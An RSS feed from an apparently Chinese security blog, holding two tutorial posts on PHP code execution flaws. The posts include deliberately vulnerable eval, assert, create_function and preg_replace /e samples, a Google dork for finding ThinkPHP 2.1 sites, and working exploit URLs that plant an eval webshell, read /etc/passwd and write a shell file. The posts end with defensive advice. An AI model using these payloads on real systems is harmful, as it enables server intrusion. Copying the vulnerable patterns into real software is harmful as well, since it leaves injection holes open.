<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>代码执行 on </title>
    <link>http://wyb0.com/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</link>
    <description>Recent content in 代码执行 on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Fri, 14 Oct 2016 13:16:32 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>代码执行漏洞2</title>
      <link>http://wyb0.com/posts/code-execution-vulnerabilities-2/</link>
      <pubDate>Fri, 14 Oct 2016 13:16:32 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/code-execution-vulnerabilities-2/</guid>
      <description>

&lt;p&gt;接着上一篇：&lt;a href=&#34;http://reber-9.com/posts/code-execution-vulnerabilities/&#34;&gt;http://reber-9.com/posts/code-execution-vulnerabilities/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;0x00-函数create-function:e25fe75a65f9a7141d9d0ac6e0b88602&#34;&gt;0x00 函数create_function()&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;php中的函数create_function()可以创建一个匿名函数，其函数原型如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;string create_function ( string $args , string $code )
其中$args是函数的参数，$code是函数的内容
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;若对提交的code未过滤或过滤不当则可能会导致代码执行漏洞&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-示例:e25fe75a65f9a7141d9d0ac6e0b88602&#34;&gt;0x01 示例&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;示例a.php代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php
    $test = @$_GET[&#39;test&#39;];
    $newfun = create_function(&#39;$a,$b&#39;, $test);
    $newfun(&#39;1111&#39;,&#39;2222&#39;);
?&amp;gt;
上述代码中$nuwfun(&#39;1111&#39;,&#39;2222&#39;)代表此时$a=&#39;1111&#39;,$b=&#39;2222&#39;,然后将其传给$test
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_create_function1.png&#34; alt=&#34;示例1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_create_function2.png&#34; alt=&#34;示例2&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_create_function3.png&#34; alt=&#34;示例3&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-函数assert:e25fe75a65f9a7141d9d0ac6e0b88602&#34;&gt;0x02 函数assert()&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;这个函数和eval()的作用差不多&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php @assert($_GET[&#39;str&#39;]); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_assert.png&#34; alt=&#34;函数assert()&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>代码执行漏洞</title>
      <link>http://wyb0.com/posts/code-execution-vulnerabilities/</link>
      <pubDate>Mon, 25 Jul 2016 22:32:51 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/code-execution-vulnerabilities/</guid>
      <description>

&lt;h3 id=&#34;0x00-代码执行:e5133e9592c5866433386f4a7b297c84&#34;&gt;0x00 代码执行&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，
没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-相关函数:e5133e9592c5866433386f4a7b297c84&#34;&gt;0x01 相关函数&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;PHP：eval assert
Python：exec
asp：&amp;lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&amp;gt;
Java：没有类似函数，但采用的反射机制和各种基于反射机制的表达式引擎(OGNL、SpEL、MVEL等)有类似功能
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-phpcms中的string2array函数:e5133e9592c5866433386f4a7b297c84&#34;&gt;0x02 phpcms中的string2array函数&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;这个函数可以将phpcms的数据库settings的字符串形式的数组内容转换为真实的数组&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;array(  //这个是字符串形式的数组，它并不是数组，而是字符串
    &#39;upload_maxsize&#39; =&amp;gt; &#39;2048&#39;,
    &#39;upload_allowext&#39; =&amp;gt; &#39;jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf&#39;, 
    &#39;watermark_enable&#39; =&amp;gt; &#39;1&#39;,
    &#39;watermark_minwidth&#39; =&amp;gt; &#39;300&#39;,
    &#39;watermark_minheight&#39; =&amp;gt; &#39;300&#39;,
    &#39;watermark_img&#39; =&amp;gt; &#39;/statics/img/water/mark.png&#39;,
    &#39;watermark_pct&#39; =&amp;gt; &#39;85&#39;,
    &#39;watermark_quality&#39; =&amp;gt; &#39;80&#39;,
    &#39;watermark_pos&#39; =&amp;gt; &#39;9&#39;,
)
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function string2array($data) {
    //这个函数可以将字符串$data转化为数组
    if($data == &#39;&#39;) 
        return array(); 
    @eval(&amp;quot;\$array = $data;&amp;quot;); 
        return $array;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-漏洞危害:e5133e9592c5866433386f4a7b297c84&#34;&gt;0x03 漏洞危害&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;执行代码
让网站写shell
甚至控制服务器
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x04-漏洞分类-也是利用点:e5133e9592c5866433386f4a7b297c84&#34;&gt;0x04 漏洞分类(也是利用点)&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;执行代码的函数：eval、assert
callback函数：preg_replace + /e模式
反序列化：unserialize()(反序列化函数)
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x05-漏洞挖掘:e5133e9592c5866433386f4a7b297c84&#34;&gt;0x05 漏洞挖掘&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;框架找漏洞，如ThinkPHP：
  inurl:index.php intext:ThinkPHP 2.1 { Fast &amp;amp; Simple OOP PHP Framework }
框架的URL格式如下：
  Site:Port/Module name/Method name/Property name/Preperty value
  Site:Port/index.php?m=Module_name&amp;amp;f=Method_name&amp;amp;v=Preperty_value
  
  www.xx.com:88/News/show/id/328
  www.yy.com:99/index.php?m=News&amp;amp;f=detail&amp;amp;item=23
  www.zz.com/global_cms_contentview_id_2435
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x06-搭建环境实验:e5133e9592c5866433386f4a7b297c84&#34;&gt;0x06 搭建环境实验&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;示例一&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
    $data = $_GET[&#39;data&#39;];
    eval(&amp;quot;\$ret = $data;&amp;quot;);
    echo $ret;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_eval1.png&#34; alt=&#34;代码执行漏洞使用eval函数1.png&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;示例二&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
    $data = $_GET[&#39;data&#39;];
    eval(&amp;quot;\$ret = strtolower(&#39;$data&#39;);&amp;quot;);
    echo $ret;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_eval2.png&#34; alt=&#34;代码执行漏洞使用eval函数2.png&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;示例三&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
    $data = $_GET[&#39;data&#39;];
    eval(&amp;quot;\$ret = strtolower(\&amp;quot;$data\&amp;quot;);&amp;quot;);
    echo $ret;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_eval3.png&#34; alt=&#34;代码执行漏洞使用eval函数3.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_eval4.png&#34; alt=&#34;代码执行漏洞使用eval函数4.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;示例四&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
    $data = $_GET[&#39;data&#39;];
    eval(&amp;quot;\$ret = strtolower(\&amp;quot;$data\&amp;quot;);&amp;quot;);
    echo $ret;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_eval5.png&#34; alt=&#34;代码执行漏洞使用eval函数5.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_eval6.png&#34; alt=&#34;代码执行漏洞使用eval函数6.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;示例五&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;p&gt;mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])&lt;br /&gt;
/e修正符使preg_replace()将replacement参数当作PHP 代码(在适当的逆向引用替换完之后)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
    $data = $GET_[&#39;data&#39;];
    // echo $data;
    preg_replace(&#39;/&amp;lt;data&amp;gt;(.*)&amp;lt;\/data&amp;gt;/e&#39;,&#39;$ret = &amp;quot;\\1&amp;quot;&#39;,$data);
    echo $ret;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_preg_replace.png&#34; alt=&#34;代码执行漏洞使用preg_replace函数.png&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x07-具体操作:e5133e9592c5866433386f4a7b297c84&#34;&gt;0x07 具体操作&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;# 一般找CMS相应版本漏洞，如ThinkPHP2.1
* 一句话
    http://www.xxx.com/News/detail/id/{${@eval($_POST[aa])}}
* 得到当前路径
    http://www.xxx.com/News/detail/id/{${print(getcwd()))}}
* 读文件
    http://www.xxx.com/News/detail/id/{${exit(var_dump(file_get_contents($_POST[&#39;f&#39;])))}}
    POST的数据为：f=/etc/passwd
* 写shell
    http://www.xxx.com/News/detail/id/{${exit(var_dump(file_put_contents($_POST[&#39;f&#39;],$_POST[d])))}}
    POST的数据为：f=1.php&amp;amp;d=&amp;lt;?php @eval($_POST[&#39;aa&#39;])?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x08-漏洞防御:e5133e9592c5866433386f4a7b297c84&#34;&gt;0x08 漏洞防御&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;使用json保存数组，当读取时就不需要使用eval了&lt;/li&gt;
&lt;li&gt;对于必须使用eval的地方，一定严格处理用户数据&lt;/li&gt;
&lt;li&gt;字符串使用单引号包括可控代码，插入前使用addslashes转义&lt;/li&gt;
&lt;li&gt;放弃使用preg_replace的e修饰符，使用preg_replace_callback()替换&lt;/li&gt;
&lt;li&gt;若必须使用preg_replace的e修饰符，则必用单引号包裹正则匹配出的对象&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;
下一篇：&lt;a href=&#34;http://wyb0.com/posts/code-execution-vulnerabilities-2/&#34;&gt;http://wyb0.com/posts/code-execution-vulnerabilities-2/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>